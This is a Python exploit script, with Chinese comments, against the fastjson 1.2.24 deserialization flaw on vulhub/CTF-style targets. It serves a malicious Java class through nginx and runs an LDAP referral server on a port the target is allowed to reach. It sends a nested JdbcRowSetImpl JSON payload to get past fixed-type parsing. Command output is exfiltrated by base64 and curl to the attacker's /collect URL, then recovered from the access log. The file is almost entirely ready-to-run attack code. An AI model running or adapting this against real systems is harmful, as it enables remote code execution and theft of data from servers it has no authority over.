#!/usr/bin/env python3
"""固定类型解析（@RequestBody User 类靶场）+ 靶机出网端口受限场景的一键利用脚本。

适用形态（vulhub fastjson 1.2.24-rce 及同类 CTF）：
  - 应用把 body 解析成固定类型（如 User.class），根级 @type 顶替报 "type not match"
  - 已有字段（name 等）内嵌套 @type 仍会实例化 gadget（字段嵌套绕过）
  - 靶机出网按端口白名单（如仅允许 80/443/8000-8001），1389 等端口 SYN 被丢

原理：
  1. 恶意类经 nginx 静态文件下发（写 /var/www/letsencrypt/ExecShell.class，
     需在 nginx 增配 location = /ExecShell.class，脚本输出配置片段）
  2. LDAP 监听在出网白名单端口（默认 8001），codebase 指向 nginx 80 端口
  3. 命令输出 base64 后经 nginx access.log 的 GET 参数回传
     （/collect?d=<b64>，grep access.log 解码即可，无需改 nginx 日志格式）

用法（服务器上 sudo 运行，LDAP 8001 需放行入站）：
  sudo python3 jndi_nginx_exfil.py http://target:port/ 175.178.212.158 'ls /; cat /flag*'
"""
import sys, time, os, socket

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)) + "/..")
from fastjsonexploit import bytecode
from fastjsonexploit.server import LdapRefServer

NGINX_ROOT = "/var/www/letsencrypt"   # nginx root（按目标服务器实际配置调整）


def free_port(start: int) -> int:
    for p in range(start, start + 50):
        s = socket.socket()
        try:
            s.bind(("0.0.0.0", p))
            return p
        except OSError:
            continue
        finally:
            s.close()
    return start


def main():
    if len(sys.argv) < 4:
        print(__doc__)
        return 2
    target_url, lhost, cmd = sys.argv[1], sys.argv[2], sys.argv[3]

    http_port = free_port(8001)          # codebase 走 nginx 80，此端口仅占位
    ldap_port = free_port(8001 if http_port != 8001 else 8002)

    # 恶意类：命令输出 base64 后经 nginx access.log 回传
    cmd_full = (f"({cmd}) | base64 -w0 > /tmp/.o 2>&1; "
                f"curl -s \"http://{lhost}/collect?d=$(cat /tmp/.o)\" >/dev/null 2>&1")
    cls = bytecode.build_jndi_shell(cmd_full)
    class_path = os.path.join(NGINX_ROOT, "ExecShell.class")
    with open(class_path, "wb") as f:
        f.write(cls)
    os.chmod(class_path, 0o644)
    print(f"[+] 恶意类已写入 {class_path}（{len(cls)} 字节）")
    print("""[i] 确认 nginx 已含以下 location（80 端口 server 块内）并 reload：
    location = /ExecShell.class { root %s; }
    location = /collect { return 200 "ok"; }""" % NGINX_ROOT)

    ldap = LdapRefServer(lhost, ldap_port, 80, mode="remote", cmd=cmd_full)
    ldap.start()
    print(f"[+] LDAP: ldap://{lhost}:{ldap_port}/Exploit  codebase: http://{lhost}:80/")

    import urllib.request
    payload = ('{"name":{"@type":"com.sun.rowset.JdbcRowSetImpl",'
               f'"dataSourceName":"ldap://{lhost}:{ldap_port}/Exploit",'
               '"autoCommit":true},"age":1}')
    req = urllib.request.Request(target_url, data=payload.encode(),
                                 headers={"Content-Type": "application/json"})
    try:
        urllib.request.urlopen(req, timeout=15)
    except Exception as e:
        print("[*] 目标响应/挂起:", str(e)[:80])
    time.sleep(15)
    print("[*] ldap_hit:", ldap.ldap_hit)
    print("[i] 回传读取: sudo grep -oE 'collect\\?d=[A-Za-z0-9+/=]*' "
          "/var/log/nginx/access.log | tail -1  → 去掉 collect?d= 后 base64 -d")
    ldap.stop()
    return 0


if __name__ == "__main__":
    sys.exit(main())
